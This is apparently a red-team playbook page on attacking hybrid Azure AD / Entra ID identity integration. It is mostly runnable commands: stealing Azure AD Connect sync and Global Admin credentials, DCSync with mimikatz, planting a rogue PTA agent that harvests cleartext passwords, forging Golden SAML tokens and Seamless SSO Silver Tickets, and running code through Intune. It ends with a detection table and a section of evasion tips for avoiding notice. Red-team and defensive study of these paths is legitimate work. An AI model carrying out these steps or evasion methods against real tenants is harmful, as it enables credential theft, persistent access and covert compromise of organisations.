# Azure AD Integration Attacks

> **MITRE ATT&CK**: Multiple - Credential Access, Lateral Movement, Persistence
> **Platforms**: Windows, Azure
> **Required Privileges**: Varies (some require on-prem DA, others cloud admin)
> **OPSEC Risk**: Medium-High

---

## Strategic Overview

The hybrid identity model -- where on-premises Active Directory synchronizes with Azure AD (now Entra ID) -- creates attack paths that span both environments. Compromising the integration layer frequently grants simultaneous access to on-prem and cloud resources. A Red Team Lead must articulate these pivot paths clearly because most organizations treat cloud and on-prem as separate security domains, when in reality they share a deeply coupled trust boundary.

---

## Technical Deep-Dive

### Azure AD Connect: The Crown Jewel

Azure AD Connect synchronizes identities between on-prem AD and Azure AD. It supports three authentication methods, each with distinct attack surfaces.

| Sync Method | How It Works | Key Risk |
|---|---|---|
| PHS (Password Hash Sync) | Hashes of on-prem passwords synced to Azure AD | Sync account has DCSync rights |
| PTA (Pass-Through Authentication) | Cloud auth validated against on-prem AD in real-time | PTA agent backdooring |
| Federation (ADFS) | SAML token-based auth via on-prem ADFS servers | Golden SAML (token signing cert) |

The Azure AD Connect server is effectively Tier 0. It holds credentials that can compromise both environments.

### Password Hash Sync (PHS) Attacks

```powershell
# Azure AD Connect stores sync credentials in MSSQL LocalDB
# The MSOL_ account typically has "Replicating Directory Changes" and
# "Replicating Directory Changes All" rights -- DCSync equivalent

# Step 1: Identify the Azure AD Connect server
Get-ADUser -Filter 'samAccountName -like "MSOL_*"' -Properties Description
# Or: Get-DomainUser -LDAPFilter "(samAccountName=MSOL_*)" -Properties description

# Step 2: Extract credentials using AADInternals (run on AAD Connect server)
Install-Module AADInternals
Import-Module AADInternals
Get-AADIntSyncCredentials
# Returns: Tenant ID, Azure AD Global Admin creds, on-prem AD sync account creds

# Step 3: Use extracted sync account for DCSync
secretsdump.py 'domain.local/MSOL_abc123def@dc01.domain.local' -just-dc
# Or with Mimikatz:
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt /authuser:MSOL_abc123def /authdomain:domain.local /authpassword:<extracted_password>"

# Step 4: Use extracted Azure AD credentials for cloud access
Connect-AzureAD -Credential (Get-Credential)  # Use extracted Global Admin creds
# Or use AADInternals for direct cloud manipulation

# Manual DPAPI-based extraction (if AADInternals blocked)
# Credentials stored in: C:\Program Files\Microsoft Azure AD Sync\Data\
# Encrypted with DPAPI - extract with mimikatz dpapi::masterkey + dpapi::cred
sqlcmd -S "(localdb)\.\ADSync" -Q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
```

### Pass-Through Authentication (PTA) Attacks

```powershell
# PTA Agent validates cloud login credentials against on-prem AD
# A malicious PTA agent accepts ALL passwords while passing them to the attacker

# Step 1: Identify PTA Agents
Get-AADIntPTAAgents  # Lists all registered PTA agents

# Step 2: Install backdoor PTA agent (requires admin on any domain-joined server)
Install-AADIntPTASpy
# This registers a rogue PTA agent that:
#   - Accepts any password for any user
#   - Logs all authentication attempts with cleartext passwords

# Step 3: Harvest credentials
Get-AADIntPTASpyLog
# Returns: username, password (cleartext) for every cloud login attempt

# Step 4: Alternatively, intercept on existing PTA agent
# The PTA agent uses a certificate stored in the machine cert store
# Extract this cert to register your own agent
# Certificate location: LocalMachine\My store, issued by "MS-Organization-Access"

# Impact: ANY Azure AD authentication now flows through attacker-controlled agent
# This persists across password changes since it intercepts at auth time
```

### Federation (ADFS) / Golden SAML

```powershell
# Golden SAML: Extract ADFS token signing certificate to forge SAML tokens
# Equivalent to Golden Ticket but for federated cloud authentication

# Step 1: Identify ADFS servers
Get-ADFSProperties  # Run on ADFS server
Get-DomainComputer -LDAPFilter "(servicePrincipalName=*adfs*)"

# Step 2: Extract token signing certificate
# Method A: AADInternals
Export-AADIntADFSSigningCertificate

# Method B: ADFSDump (from Mandiant/FireEye)
ADFSDump.exe /domain:domain.local /server:adfs01.domain.local

# Method C: Direct extraction from ADFS configuration database
# ADFS stores config in Windows Internal Database (WID) or MSSQL
# WID path: \\.\pipe\MICROSOFT##WID\tsql\query
# Table: IdentityServerPolicy.ServiceSettings (XML blob with encrypted cert)

# Step 3: Forge SAML token for any cloud user
# Using AADInternals
$cert = Import-PfxCertificate -FilePath .\adfs_signing.pfx -CertStoreLocation Cert:\CurrentUser\My
New-AADIntSAMLToken -ImmutableId "abc123==" -Issuer "http://adfs.domain.local/adfs/services/trust" -PfxFileName .\adfs_signing.pfx -PfxPassword ""

# Step 4: Use forged SAML token to access Office 365, Azure, etc.
Open-AADIntOffice365Portal -SAMLToken $token

# Golden SAML persists until:
#   - Token signing certificate is rotated (rare, often years)
#   - Federation trust is rebuilt
#   - Certificate is explicitly revoked
```

### Seamless SSO Abuse

```powershell
# Seamless SSO uses a computer account AZUREADSSOACC$ in on-prem AD
# Its Kerberos key enables SSO to Azure AD

# Step 1: Extract AZUREADSSOACC$ NTLM hash
mimikatz.exe "lsadump::dcsync /domain:domain.local /user:AZUREADSSOACC$"

# Step 2: Forge Silver Ticket for cloud SSO
mimikatz.exe "kerberos::golden /user:targetuser /domain:domain.local /sid:S-1-5-21-DOMAIN_SID /rc4:<AZUREADSSOACC_HASH> /id:1337 /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"

# Step 3: Use ticket to access Azure AD as any synced user
# The forged ticket grants SSO authentication to Azure AD
# Works for any user that exists in both on-prem and Azure AD

# Note: Microsoft rotates this key every 30 days if configured
# Many orgs have never rotated it since initial setup
```

### Cloud-to-On-Prem Pivoting

```powershell
# Azure AD roles with on-prem impact
# - Global Administrator: can reset Azure AD Connect, modify PTA
# - Intune Administrator: can push scripts/apps to domain-joined devices
# - Hybrid Identity Administrator: manages Azure AD Connect configuration

# Intune-based code execution (cloud admin to on-prem foothold)
# 1. Create malicious PowerShell script in Intune
# 2. Assign to device group containing domain-joined machines
# 3. Script executes as SYSTEM on target devices

# Hybrid Join device abuse
# If you control an Azure AD-joined device, you may access on-prem resources
# via Primary Refresh Token (PRT) and Kerberos ticket mapping

# ROADtools for Azure AD reconnaissance
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui   # Web interface for exploring Azure AD data

# AzureHound for attack path mapping (BloodHound for Azure)
azurehound -u user@domain.com -p password -t tenant.onmicrosoft.com
# Import into BloodHound for hybrid attack path analysis
```

---

## Detection & Evasion

### Detection Opportunities

| Indicator | Source | What to Look For |
|---|---|---|
| AAD Connect credential access | Windows Event Log on AAD Connect server | Process access to ADSync database, DPAPI operations |
| Rogue PTA Agent | Azure AD Sign-in Logs | Authentication from unexpected PTA agent IPs |
| ADFS cert access | Event 1007, 1200 on ADFS | Token signing certificate read operations |
| Golden SAML usage | Azure AD Sign-in Logs | SAML tokens with anomalous claims or timestamps |
| AZUREADSSOACC$ DCSync | Event 4662 on DC | Replication request targeting SSO account |
| Unusual sync patterns | Azure AD Audit Logs | Bulk credential changes, new sync configurations |

### Evasion Techniques

```
- Time PHS extraction during normal sync windows (every 2 minutes by default)
- Use existing MSOL_ account rather than creating new sync accounts
- Golden SAML tokens should use valid ImmutableId values from real users
- PTA backdoor: match legitimate PTA agent behavior patterns
- Avoid accessing Azure AD Connect server from unusual source IPs
- Clean up AADInternals module after use (Remove-Module, delete from disk)
```

---

## Cross-References

- [Azure AD Attacks](../13-cloud-security/azure/azure-ad-attacks.md) - Cloud-native attack techniques
- [AD Fundamentals](ad-fundamentals.md) - On-prem AD architecture
- [DCSync](../07-credential-access/dcsync.md) - PHS sync account abuse path
- [Golden Ticket](../07-credential-access/golden-ticket.md) - Parallels with Golden SAML
- [ADCS Abuse](adcs-abuse.md) - Certificate-based persistence comparison

---

## References

- Dr. Nestori Syynimaa: AADInternals documentation and research
- Mandiant: "Golden SAML" attack research and ADFSDump tool
- Dirk-jan Mollema: Azure AD Connect credential extraction research
- Doug Bienstock (Mandiant): "Golden SAML Revisited"
- Microsoft: Azure AD Connect security considerations
- Andy Robbins: AzureHound and hybrid attack path research
- MITRE ATT&CK: T1606.002 - Forge Web Credentials: SAML Tokens
